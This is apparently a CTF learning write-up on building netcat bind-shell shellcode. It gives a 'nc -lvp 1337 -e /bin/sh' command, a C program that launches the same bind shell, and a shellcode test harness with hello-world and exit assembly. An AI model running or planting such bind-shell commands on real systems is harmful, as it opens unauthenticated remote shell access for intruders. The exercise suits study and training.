

# URL : http://cybersphinx.com/2017/02/23/developing-netcat-shellcode/

# Stage 1 [Manually Find Required Command]

:~# nc -lvp 1337 -e/bin/sh

Test Result: OK

└──╼ #nc -lvp 1337 -e /bin/sh
listening on [any] 1337 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 37022


# Stage 2 [Develop C program]

// include header files
#include <stdio.h> // Standard Input Output Header
#include <unistd.h>

// Main Function
int main(){
        char *arguments[] = {"/bin/nc",
                              "-lvp", // L : Listen | V: Verbose (Not Recommended) | P : Port Number
                              "1337", // Port Number
                              "-e",   // Execute
                              "/bin/sh" // bash
                               };
        execve("/bin/nc", arguments, NULL); 
        return 0;
}

# Stage 3
#          [Develop In Assembly language]
#
# Reference URLs:
#                http://www.vividmachines.com/shellcode/shellcode.html
#
#┌─[suraj@parrot]─[~/Desktop/Fusion_CTF/Shellcoding/examples]
#└──╼ $nasm -f elf exit.asm 
#┌─[✗]─[suraj@parrot]─[~/Desktop/Fusion_CTF/Shellcoding/examples]
#└──╼ $ld -m elf_i386 -s -o exiter exit.o
#
# During Testing Normal Shellcode Testing skeliton showings error so, after testing/ google i found this solution
/*shellcodetest.c*/ 

const char shellcode[] = "\x31\xC0\x31\xDB\x31\xC9\x31\xD2\xB0\x01\xCD\x80"; 

int main() 
{	 
	int *ret; // a simple integer pointer pointing a address 
	ret = (int *)&ret + 2; // change the address pointed by 
	(*ret) = (int)shellcode; // change the return pointer to the shellcode .. so we'll be jumping to our shellcode right away
} 


# Working On Fusion Machine
# Trial One [Hello World]
---------------------------------------------------------------------------
Disassembler https://defuse.ca/online-x86-assembler.htm#disassembly
---------------------------------------------------------------------------
#     Clean Registers

xor eax, eax
xor ebx, ebx
xor ecx, ecx 
xor edx, edx 

# Hello World [Load Stack]
push eax
push 0x41414141
push 0x42424242
push 0x43434343

# Write routine
mov al, 4  # syscall write
mov bl, 1  # stdout
mov ecx, esp    #
mov dl, 12 #  

int 0x80

#  Exit Routine
#   Load Arguments
mov al, 1
xor ebx, ebx
int 0x80

#
